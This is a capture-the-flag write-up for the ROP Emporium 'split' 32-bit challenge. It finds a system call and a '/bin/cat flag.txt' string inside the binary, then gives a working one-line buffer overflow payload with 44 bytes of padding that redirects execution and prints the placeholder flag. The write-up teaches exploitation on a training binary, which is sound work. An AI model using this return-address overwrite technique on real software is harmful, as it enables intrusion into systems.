In this challenge, there's 2 interesting things: `usefulFunction` and `usefulString`:

```c
void usefulFunction(void)
{
  system("/bin/ls");
  return;
}
```

```
                             usefulString                                    XREF[1]:     Entry Point(*)  
        0804a030 2f 62 69        ds         "/bin/cat flag.txt"
                 6e 2f 63 
                 61 74 20 
```

Since this is x86, we can call the system function and it will use the first stack variable as the input. Since we already got the `/bin/cat flag.txt` input's address, we now need the call `system` address. Disassembling the `usefulFunction` gives us the address (Note: We need to the `call system@plt` address, not the `system@plt` address). The padding size to overwrite the return address of the `pwnme` function in this challenge is 44.

With both of the instructions, we can now build a payload to get the string:

```bash
python -c 'import sys;sys.stdout.buffer.write(b"A" * 44 + b"\x1a\x86\x04\x08" + b"\x30\xa0\x04\x08")' | ./split32
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> Thank you!
ROPE{a_placeholder_32byte_flag!}
```
